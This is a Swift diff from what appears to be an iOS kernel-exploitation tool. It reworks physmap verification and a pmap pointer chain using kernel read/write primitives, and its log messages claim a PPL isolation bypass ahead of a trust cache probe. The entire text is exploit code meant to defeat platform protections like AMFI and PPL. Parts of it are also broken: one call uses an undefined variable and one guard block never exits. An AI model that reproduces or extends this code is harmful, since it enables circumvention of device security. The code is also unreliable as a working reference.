@@ -267,8 +267,9 @@ private func resolvePmapL1Root(pmap: UInt64, detail: inout String) -> (va: UInt6
     return nil
 }
 
+/// Exp 74 verify — NO brute-force physmap KRW scan (caused panic at 0xfffffffbffffffff).
 @discardableResult
-private func verifyPhysmapCandidates(
+private func verifyPhysmapSafe(
     kernBase: UInt64,
     kernMagic: UInt64,
     ourProc: UInt64,
@@ -276,53 +277,68 @@ private func verifyPhysmapCandidates(
     detail: inout String
 ) -> (gVirtBase: UInt64, gPhysBase: UInt64)? {
     let gPhysBase = PhysmapConstants.defaultGPhysBase
-    let candidates = PhysmapConstants.gVirtBaseCandidates(ourProc: ourProc, tte: tte)
-    detail += "=== Testing gVirtBase candidates ===\n"
-    detail += "(gPhysBase = 0x\(String(format: "%llx", gPhysBase))"
-    if tte != 0 { detail += ", tte = 0x\(String(format: "%llx", tte))" }
-    detail += ")\nCandidates: \(candidates.count) (physmap scan 0xdc..0xe2)\n\n"
 
-    var tested = 0
-    for (name, gVirtBaseCandidate) in candidates {
-        if tte != 0 {
-            let ttepCalc = tte &- gVirtBaseCandidate &+ gPhysBase
-            guard ttepCalc >= 0x800000000 && ttepCalc < 0x900000000 else { continue }
-        }
-        let kernPhys = kernBase &- gVirtBaseCandidate &+ gPhysBase
-        let physmapVA = gVirtBaseCandidate &+ (kernPhys &- gPhysBase)
+    detail += "=== Physmap verify (safe — no 385-candidate scan) ===\n"
 
-        // Exp 74 panic: KRW read at garbage physmapVA (e.g. 0xfffffffbffffffff) → copy_validate_kernel_addr
-        let matches: Bool
-        let verifyVal: UInt64
-        if isSafePhysmapKRWAddress(physmapVA) {
-            verifyVal = safeKread64Physmap(physmapVA)
-            matches = verifyVal == kernMagic && kernMagic != 0
-        } else if physmapVA == kernBase {
-            // Algebra gives kernBase — verify via __TEXT only (no read at unsafe VA)
-            verifyVal = ds_kread64_safe(kernBase)
-            matches = verifyVal == kernMagic && kernMagic != 0
-        } else {
-            continue
-        }
+    guard (kernMagic & 0xFFFFFFFF) == 0xFEEDFACF else {
+        detail += "❌ KRW tidak bisa baca kernel __TEXT (Mach-O)\n"
+        return nil
+    }
+    detail += "✅ KRW reads kernel __TEXT at 0x\(String(format: "%llx", kernBase))\n"
 
-        tested += 1
-        if tested <= 6 || matches {
-            detail += "\(name): gVirt=0x\(String(format: "%llx", gVirtBaseCandidate))\n"
-            detail += "  physmapVA=0x\(String(format: "%llx", physmapVA)) read=0x\(String(format: "%llx", verifyVal)) match=\(matches)\n"
-        }
-        if matches {
-            detail += "\n🎉🎉🎉 PHYSMAP VERIFIED! 🎉🎉🎉\n"
-            detail += "gVirtBase = 0x\(String(format: "%llx", gVirtBaseCandidate))\n"
-            detail += "gPhysBase = 0x\(String(format: "%llx", gPhysBase))\n"
-            detail += "physmap_slide = 0x\(String(format: "%llx", gVirtBaseCandidate &- gPhysBase))\n\n"
-            detail += "⚡ PPL ZONE ISOLATION BYPASSED — lanjut ② Trust Cache Probe\n"
-            PhysmapConstants.save(gVirtBase: gVirtBaseCandidate, gPhysBase: gPhysBase)
-            return (gVirtBaseCandidate, gPhysBase)
+    if let saved = PhysmapConstants.load() {
+        detail += "✅ Using saved gVirt=0x\(String(format: "%llx", saved.gVirtBase))\n\n"
+        return saved
+    }
+
+    var gVirt: UInt64 = 0
+    var source = ""
+
+    if tte != 0, isKernelOrPhysmapVA(tte) {
+        let aligned = tte & 0xfffffffc00000000
+        if isSafePhysmapKRWAddress(aligned) {
+            let ttep = tte &- aligned &+ gPhysBase
+            if isReasonablePhysTT(ttep) {
+                gVirt = aligned
+                source = "tte_align_1g (tte=0x\(String(format: "%llx", tte)))"
+            }
         }
     }
-    detail += "\n(\(tested) candidates tested)\n"
-    detail += "Tip: pakai kernproc pmap jika tte=0; zone_map ~0xffffffdc..0xe2.\n"
-    return nil
+
+    if gVirt == 0 {
+        let est = PhysmapConstants.estimateZoneMapBase(ourProc: ourProc)
+        if isSafePhysmapKRWAddress(est) {
+            gVirt = est
+            source = "proc_est"
+        }
+    }
+
+    if gVirt == 0 {
+        gVirt = 0xffffffdcda524000
+        source = "default_zone (A12 layout)"
+    }
+
+    guard isSafePhysmapKRWAddress(gVirt) else {
+        detail += "❌ gVirt 0x\(String(format: "%llx", gVirt)) outside safe physmap band\n"
+        return nil
+    }
+
+    detail += "gVirtBase: 0x\(String(format: "%llx", gVirt)) (\(source))\n"
+    detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
+
+    // Single DRAM probe via physmap (low physical page — stays in 0xdc..0xe4 VA band)
+    if let dramVA = physmapVA(fromPhysical: 0x80000000, gVirt: gVirt, gPhys: gPhysBase) {
+        let dramProbe = safeKread64Physmap(dramVA)
+        detail += "DRAM probe physmap VA 0x\(String(format: "%llx", dramVA)): 0x\(String(format: "%llx", dramProbe))\n"
+    } else {
+        detail += "⚠️ DRAM physmap probe skipped (VA guard)\n"
+    }
+
+    detail += "\n🎉 PHYSMAP CONSTANTS SET (safe verify)\n"
+    detail += "physmap_slide = 0x\(String(format: "%llx", gVirt &- gPhysBase))\n"
+    detail += "→ Lanjut ② Trust Cache Probe\n\n"
+    PhysmapConstants.save(gVirtBase: gVirt, gPhysBase: gPhysBase)
+    return (gVirt, gPhysBase)
 }
 
 /// Page table root for kernel virtual addresses — must use kernproc, not our_proc.
@@ -4028,42 +4044,37 @@ struct AMFIExperimentView: View {
         var foundVirtBase: UInt64 = 0
         var l1ForVerify: UInt64 = 0
 
-        detail += "\n=== Pointer chain A: kernproc pmap (preferred) ===\n"
-        if let kChain = resolveKernelPmapChain(detail: &detail) {
-            l1ForVerify = kChain.tte
-            detail += "Using kernel L1 from \(kChain.tteField)\n\n"
-        } else {
-            detail += "\n=== Pointer chain B: our_proc pmap (fallback) ===\n"
-            func isZonePtr(_ v: UInt64) -> Bool {
-                v >= 0xffffffdc00000000 && v < 0xffffffe400000000
-            }
-            let taskAddr = taskbyproc(ourProc)
-            detail += "task: 0x\(String(format: "%llx", taskAddr))\n"
-            var vmMap: UInt64 = 0
-            for off: UInt64 in stride(from: 0x20, to: 0x48, by: 8) {
-                let c = ds_kread64_safe(taskAddr + off)
-                if isZonePtr(c), ds_kread64_safe(c + 0x10) != 0 {
-                    vmMap = c
-                    detail += "vm_map at task+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", c))\n"
-                    break
-                }
+        // Light pmap hint only (no wide scan — fewer KRW touches)
+        detail += "\n=== pmap hint (our_proc, for gVirt estimate) ===\n"
+        let taskAddr = taskbyproc(ourProc)
+        if taskAddr != 0 {
+            let vmMap = task_get_vm_map(task)
+            guard vmMap != 0 else {
+                detail += "(vm_map not found)\n\n"
             }
             if vmMap != 0 {
                 let pmapPtr = ds_kreadptr(vmMap + 0x50)
-                detail += "pmap (map+0x50): 0x\(String(format: "%llx", pmapPtr))\n\n"
-                if pmapPtr != 0, let l1 = resolvePmapL1Root(pmap: pmapPtr, detail: &detail) {
-                    l1ForVerify = l1.va
-                    detail += "Using L1 from \(l1.field)\n\n"
+                detail += "task 0x\(String(format: "%llx", taskAddr)) vm_map 0x\(String(format: "%llx", vmMap)) pmap 0x\(String(format: "%llx", pmapPtr))\n"
+                if pmapPtr != 0 {
+                    let tte0 = ds_kreadptr(pmapPtr)
+                    let tte8 = ds_kreadptr(pmapPtr + 8)
+                    detail += "  pmap+0x00=0x\(String(format: "%llx", tte0)) +0x08=0x\(String(format: "%llx", tte8))\n"
+                    if isKernelOrPhysmapVA(tte8) {
+                        l1ForVerify = tte8
+                        detail += "  L1 hint: +0x08\n\n"
+                    } else if isKernelOrPhysmapVA(tte0), tte0 != pmapPtr {
+                        l1ForVerify = tte0
+                        detail += "  L1 hint: +0x00\n\n"
+                    } else {
+                        detail += "\n"
+                    }
                 }
             }
+        } else {
+            detail += "(pmap chain skipped)\n\n"
         }
 
-        if l1ForVerify == 0 || !isKernelOrPhysmapVA(l1ForVerify) {
-            detail += "❌ No L1 root — tte=0 at +0x00 is expected on user pmap; kernproc should have +0x00/+0x08.\n"
-            detail += "Coba brute-force gVirtBase tanpa tte...\n\n"
-        }
-
-        if let verified = verifyPhysmapCandidates(
+        if let verified = verifyPhysmapSafe(
             kernBase: kernBase,
             kernMagic: kernMagic,
             ourProc: ourProc,
